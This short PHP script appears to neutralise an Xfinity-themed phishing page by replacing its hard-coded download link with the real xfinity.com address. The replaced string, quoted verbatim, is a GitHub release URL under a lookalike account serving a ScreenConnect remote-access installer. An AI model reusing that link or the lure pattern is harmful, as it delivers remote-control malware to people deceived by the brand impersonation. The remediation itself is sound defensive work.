<?php
// Set to your verified, authorized HTTPS destination.
$destinationUrl = 'https://www.xfinity.com/';
$parts = parse_url($destinationUrl);
$valid = is_array($parts) && strtolower($parts['scheme'] ?? '') === 'https' && !empty($parts['host']);
if (!$valid) { http_response_code(500); $destinationUrl = ''; }
// Use a static allowlisted destination; never redirect to a user-supplied query parameter.
$html = file_get_contents(__DIR__ . '/index.html');
$encoded = json_encode($destinationUrl, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_UNESCAPED_SLASHES);
$html = str_replace("const DESTINATION_URL = 'https://github.com/xfinixtyWebmail600px/NewApp600/releases/download/Newverison600/screenconnect.clientsetup.msi';", 'const DESTINATION_URL = ' . $encoded . ';', $html);
header('Content-Type: text/html; charset=utf-8');
header('Cache-Control: no-store');
echo $html;
